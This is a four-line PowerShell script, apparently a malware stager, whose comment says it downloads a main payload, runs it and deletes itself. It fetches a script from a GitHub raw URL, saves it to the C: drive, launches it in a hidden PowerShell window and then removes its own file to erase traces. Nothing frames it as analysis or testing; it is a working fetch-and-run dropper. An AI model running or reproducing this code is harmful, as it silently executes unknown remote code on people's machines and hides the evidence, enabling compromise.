# Downloads main payload and runs it, then deletes itself
Invoke-WebRequest 'https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/Win64.ps1' -OutFile 'C:\Win64.ps1'
Start-Process powershell -WindowStyle Hidden -ArgumentList '-File C:\Win64.ps1'
Remove-Item $PSCommandPath -Force
